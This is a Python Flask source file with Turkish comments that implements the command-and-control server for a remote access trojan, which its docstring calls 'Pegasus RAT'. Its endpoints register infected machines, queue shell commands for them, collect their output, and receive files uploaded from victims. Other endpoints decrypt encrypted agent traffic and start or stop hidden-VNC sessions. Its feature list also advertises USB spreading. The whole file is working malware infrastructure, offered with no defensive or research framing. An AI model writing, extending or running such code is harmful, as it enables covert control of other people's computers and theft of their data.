#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Pegasus-Loki Entegre API
Pegasus RAT özelliklerini destekleyen gelişmiş API endpoints
"""

import os
import json
import base64
import hashlib
from datetime import datetime, timedelta
from flask import Blueprint, request, jsonify, abort, url_for, current_app
from werkzeug.utils import secure_filename
from markupsafe import escape
import traceback

# Pegasus şifreleme modülü
try:
    import sys
    sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'agent'))
    from pegasus_crypto import PegasusAES, PegasusConfig
    PEGASUS_CRYPTO_AVAILABLE = True
except ImportError:
    PEGASUS_CRYPTO_AVAILABLE = False
    print("Pegasus crypto modülü yüklenemedi")

# Veritabanı modelleri
try:
    from .models import Agent, Command, db
except ImportError:
    try:
        from models import Agent, Command, db
    except ImportError:
        print("Veritabanı modelleri yüklenemedi")

pegasus_api = Blueprint('pegasus_api', __name__)

# Pegasus şifreleme nesnesi (global)
pegasus_crypto = None

def init_pegasus_crypto():
    """
    Pegasus şifreleme sistemini başlatır
    """
    global pegasus_crypto
    try:
        if PEGASUS_CRYPTO_AVAILABLE and not pegasus_crypto:
            config = PegasusConfig()
            pegasus_crypto = PegasusAES(config.master_key)
            print("Pegasus şifreleme sistemi başlatıldı")
            return True
    except Exception as e:
        print(f"Pegasus şifreleme başlatma hatası: {e}")
    return False

def decrypt_if_encrypted(data):
    """
    Eğer veri şifrelenmiş ise çözer
    """
    global pegasus_crypto
    
    if not pegasus_crypto or not isinstance(data, dict):
        return data
    
    try:
        # Şifrelenmiş veri kontrolü
        if 'encrypted_data' in data:
            decrypted = pegasus_crypto.decrypt(data['encrypted_data'])
            return json.loads(decrypted)
        elif 'encrypted_output' in data:
            return {'output': pegasus_crypto.decrypt(data['encrypted_output'])}
    except Exception as e:
        print(f"Şifre çözme hatası: {e}")
    
    return data

def get_or_create_agent(agent_id, agent_info=None):
    """
    Agent'ı bulur veya oluşturur
    """
    try:
        # Mevcut agent'ı bul
        agent = Agent.query.filter_by(agent_id=agent_id).first()
        
        if not agent:
            # Yeni agent oluştur
            agent = Agent(agent_id=agent_id)
            db.session.add(agent)
        
        # Agent bilgilerini güncelle
        if agent_info:
            agent.hostname = agent_info.get('hostname', agent.hostname)
            agent.username = agent_info.get('username', agent.username)
            agent.operating_system = agent_info.get('platform', agent.operating_system)
            agent.remote_ip = request.remote_addr
            agent.last_online = datetime.utcnow()
            agent.status = 'online'
            
            # Geolocation (basit)
            agent.geolocation = 'Local'
        
        db.session.commit()
        return agent
        
    except Exception as e:
        print(f"Agent oluşturma/güncelleme hatası: {e}")
        db.session.rollback()
        return None

@pegasus_api.route('/<agent_id>/hello', methods=['POST'])
def agent_hello(agent_id):
    """
    Gelişmiş agent hello endpoint'i
    Pegasus şifreleme ve gelişmiş özellikler destekler
    """
    try:
        # Şifreleme sistemini başlat
        if not pegasus_crypto:
            init_pegasus_crypto()
        
        # Request verisini al ve şifresini çöz
        if request.is_json:
            data = request.get_json()
            agent_info = decrypt_if_encrypted(data)
        else:
            agent_info = {
                'platform': request.form.get('platform', 'Unknown'),
                'hostname': request.form.get('hostname', 'Unknown'),
                'username': request.form.get('username', 'Unknown')
            }
        
        # Agent'ı bul veya oluştur
        agent = get_or_create_agent(agent_id, agent_info)
        if not agent:
            return "Agent oluşturulamadı", 500
        
        # Bekleyen komutları kontrol et
        pending_commands = Command.query.filter_by(
            agent_id=agent.id,
            executed=False
        ).order_by(Command.timestamp.asc()).first()
        
        if pending_commands:
            # Komutu işaretle (opsiyonel)
            # pending_commands.executed = True
            # db.session.commit()
            return pending_commands.cmdline
        
        return ""
        
    except Exception as e:
        print(f"Agent hello hatası: {e}")
        traceback.print_exc()
        return "Sunucu hatası", 500

@pegasus_api.route('/<agent_id>/report', methods=['POST'])
def agent_report(agent_id):
    """
    Gelişmiş agent rapor endpoint'i
    Şifrelenmiş çıktıları destekler
    """
    try:
        # Agent'ı bul
        agent = Agent.query.filter_by(agent_id=agent_id).first()
        if not agent:
            return "Agent bulunamadı", 404
        
        # Çıktıyı al ve şifresini çöz
        if request.is_json:
            data = request.get_json()
            decrypted_data = decrypt_if_encrypted(data)
            output = decrypted_data.get('output', '')
        else:
            output = request.form.get('output', '')
            # Şifrelenmiş form verisi kontrolü
            encrypted_output = request.form.get('encrypted_output')
            if encrypted_output and pegasus_crypto:
                try:
                    output = pegasus_crypto.decrypt(encrypted_output)
                except:
                    pass
        
        # Çıktıyı agent'a ekle
        if output:
            agent.output += escape(output)
            agent.last_online = datetime.utcnow()
            db.session.commit()
        
        return "OK"
        
    except Exception as e:
        print(f"Agent report hatası: {e}")
        return "Sunucu hatası", 500

@pegasus_api.route('/<agent_id>/upload', methods=['POST'])
def agent_upload(agent_id):
    """
    Gelişmiş dosya yükleme endpoint'i
    """
    try:
        # Agent'ı bul
        agent = Agent.query.filter_by(agent_id=agent_id).first()
        if not agent:
            return "Agent bulunamadı", 404
        
        if 'uploaded' not in request.files:
            return "Dosya bulunamadı", 400
        
        file = request.files['uploaded']
        if file.filename == '':
            return "Dosya adı boş", 400
        
        # Güvenli dosya adı
        filename = secure_filename(file.filename)
        
        # Agent klasörü
        agent_dir = agent.agent_id
        upload_dir = current_app.config.get('UPLOAD_FOLDER', 'server/webui/static/uploads')
        store_dir = os.path.join(upload_dir, agent_dir)
        
        # Klasörü oluştur
        os.makedirs(store_dir, exist_ok=True)
        
        # Dosya yolu
        file_path = os.path.join(store_dir, filename)
        
        # Aynı isimde dosya varsa prefix ekle
        counter = 1
        original_filename = filename
        while os.path.exists(file_path):
            name, ext = os.path.splitext(original_filename)
            filename = f"{name}_{counter}{ext}"
            file_path = os.path.join(store_dir, filename)
            counter += 1
        
        # Dosyayı kaydet
        file.save(file_path)
        
        # Download linki oluştur
        download_link = url_for('webui.uploads', path=f"{agent_dir}/{filename}")
        
        # Agent çıktısına ekle
        file_info = f'[*] Dosya yüklendi: <a target="_blank" href="{download_link}">{filename}</a> ({os.path.getsize(file_path)} bytes)\n'
        agent.output += file_info
        agent.last_online = datetime.utcnow()
        db.session.commit()
        
        return "Yükleme başarılı"
        
    except Exception as e:
        print(f"Dosya yükleme hatası: {e}")
        return "Yükleme hatası", 500

@pegasus_api.route('/<agent_id>/status', methods=['GET', 'POST'])
def agent_status(agent_id):
    """
    Agent durumu endpoint'i
    """
    try:
        agent = Agent.query.filter_by(agent_id=agent_id).first()
        if not agent:
            return jsonify({'error': 'Agent bulunamadı'}), 404
        
        if request.method == 'POST':
            # Durum güncelleme
            data = request.get_json() or {}
            decrypted_data = decrypt_if_encrypted(data)
            
            if 'status' in decrypted_data:
                agent.status = decrypted_data['status']
            
            agent.last_online = datetime.utcnow()
            db.session.commit()
        
        # Durum bilgilerini döndür
        return jsonify({
            'agent_id': agent.agent_id,
            'hostname': agent.hostname,
            'username': agent.username,
            'platform': agent.operating_system,
            'status': agent.status,
            'last_online': agent.last_online.isoformat() if agent.last_online else None,
            'is_online': agent.is_online()
        })
        
    except Exception as e:
        print(f"Agent status hatası: {e}")
        return jsonify({'error': 'Sunucu hatası'}), 500

@pegasus_api.route('/<agent_id>/services', methods=['GET', 'POST'])
def agent_services(agent_id):
    """
    Agent servis durumu endpoint'i (HVNC, USB, Security)
    """
    try:
        agent = Agent.query.filter_by(agent_id=agent_id).first()
        if not agent:
            return jsonify({'error': 'Agent bulunamadı'}), 404
        
        if request.method == 'POST':
            # Servis durumu güncelleme
            data = request.get_json() or {}
            decrypted_data = decrypt_if_encrypted(data)
            
            services_info = decrypted_data.get('services', {})
            
            # Servis bilgilerini agent çıktısına ekle
            if services_info:
                service_report = f"[*] Servis Durumu Güncellendi:\n{json.dumps(services_info, indent=2)}\n"
                agent.output += service_report
                agent.last_online = datetime.utcnow()
                db.session.commit()
            
            return jsonify({'status': 'updated'})
        
        # Mevcut servis durumunu döndür (agent'tan son rapor)
        return jsonify({'status': 'ok'})
        
    except Exception as e:
        print(f"Agent services hatası: {e}")
        return jsonify({'error': 'Sunucu hatası'}), 500

@pegasus_api.route('/<agent_id>/hvnc', methods=['POST'])
def agent_hvnc_control(agent_id):
    """
    HVNC kontrol endpoint'i
    """
    try:
        agent = Agent.query.filter_by(agent_id=agent_id).first()
        if not agent:
            return jsonify({'error': 'Agent bulunamadı'}), 404
        
        data = request.get_json() or {}
        action = data.get('action')
        
        if action == 'start':
            host = data.get('host', '127.0.0.1')
            port = data.get('port', 5900)
            command = f"hvnc start {host} {port}"
        elif action == 'stop':
            command = "hvnc stop"
        elif action == 'status':
            command = "hvnc status"
        else:
            return jsonify({'error': 'Geçersiz aksiyon'}), 400
        
        # Komutu agent'a gönder
        agent.push_command(command)
        
        return jsonify({
            'status': 'command_sent',
            'command': command,
            'action': action
        })
        
    except Exception as e:
        print(f"HVNC kontrol hatası: {e}")
        return jsonify({'error': 'Sunucu hatası'}), 500

@pegasus_api.route('/<agent_id>/encrypt', methods=['POST'])
def encrypt_data(agent_id):
    """
    Veri şifreleme endpoint'i
    """
    try:
        if not pegasus_crypto:
            init_pegasus_crypto()
        
        if not pegasus_crypto:
            return jsonify({'error': 'Şifreleme mevcut değil'}), 400
        
        data = request.get_json() or {}
        plaintext = data.get('data')
        
        if not plaintext:
            return jsonify({'error': 'Şifrelenecek veri gerekli'}), 400
        
        encrypted = pegasus_crypto.encrypt(plaintext)
        
        return jsonify({
            'encrypted_data': encrypted,
            'status': 'success'
        })
        
    except Exception as e:
        print(f"Şifreleme hatası: {e}")
        return jsonify({'error': 'Şifreleme hatası'}), 500

@pegasus_api.route('/<agent_id>/decrypt', methods=['POST'])
def decrypt_data(agent_id):
    """
    Veri şifre çözme endpoint'i
    """
    try:
        if not pegasus_crypto:
            init_pegasus_crypto()
        
        if not pegasus_crypto:
            return jsonify({'error': 'Şifre çözme mevcut değil'}), 400
        
        data = request.get_json() or {}
        encrypted_data = data.get('encrypted_data')
        
        if not encrypted_data:
            return jsonify({'error': 'Şifrelenmiş veri gerekli'}), 400
        
        decrypted = pegasus_crypto.decrypt(encrypted_data)
        
        return jsonify({
            'decrypted_data': decrypted,
            'status': 'success'
        })
        
    except Exception as e:
        print(f"Şifre çözme hatası: {e}")
        return jsonify({'error': 'Şifre çözme hatası'}), 500

@pegasus_api.route('/agents/stats', methods=['GET'])
def agents_stats():
    """
    Agent istatistikleri endpoint'i
    """
    try:
        # Toplam agent sayısı
        total_agents = Agent.query.count()
        
        # Online agent sayısı (son 5 dakikada görülen)
        five_minutes_ago = datetime.utcnow() - timedelta(minutes=5)
        online_agents = Agent.query.filter(
            Agent.last_online >= five_minutes_ago
        ).count()
        
        # Platform dağılımı
        platforms = db.session.query(
            Agent.operating_system,
            db.func.count(Agent.id)
        ).group_by(Agent.operating_system).all()

        platform_stats = {}
        for platform, count in platforms:
            # None değerlerini 'Unknown' olarak değiştir
            platform_key = platform if platform is not None else 'Unknown'
            platform_stats[platform_key] = count
        
        return jsonify({
            'total_agents': total_agents,
            'online_agents': online_agents,
            'offline_agents': total_agents - online_agents,
            'platform_distribution': platform_stats,
            'last_updated': datetime.utcnow().isoformat()
        })
        
    except Exception as e:
        print(f"İstatistik hatası: {e}")
        return jsonify({'error': 'İstatistik hatası'}), 500

@pegasus_api.route('/system/info', methods=['GET'])
def system_info():
    """
    Sistem bilgileri endpoint'i
    """
    try:
        return jsonify({
            'server_version': '2.0-pegasus',
            'crypto_available': PEGASUS_CRYPTO_AVAILABLE,
            'crypto_initialized': pegasus_crypto is not None,
            'features': {
                'encryption': PEGASUS_CRYPTO_AVAILABLE,
                'hvnc': True,
                'usb_spread': True,
                'security_checks': True
            },
            'timestamp': datetime.utcnow().isoformat()
        })
        
    except Exception as e:
        print(f"Sistem bilgisi hatası: {e}")
        return jsonify({'error': 'Sistem bilgisi hatası'}), 500

# Başlatma fonksiyonu
def init_pegasus_api(app):
    """
    Pegasus API'yi Flask uygulamasına kaydeder
    """
    try:
        # Şifreleme sistemini başlat
        init_pegasus_crypto()
        
        # Blueprint'i kaydet
        app.register_blueprint(pegasus_api, url_prefix='/pegasus')
        
        print("Pegasus API başarıyla kaydedildi")
        return True
        
    except Exception as e:
        print(f"Pegasus API kayıt hatası: {e}")
        return False

# Test endpoint'i
@pegasus_api.route('/test', methods=['GET'])
def test_endpoint():
    """
    API test endpoint'i
    """
    return jsonify({
        'status': 'ok',
        'message': 'Pegasus API çalışıyor',
        'crypto_available': PEGASUS_CRYPTO_AVAILABLE,
        'timestamp': datetime.utcnow().isoformat()
    })
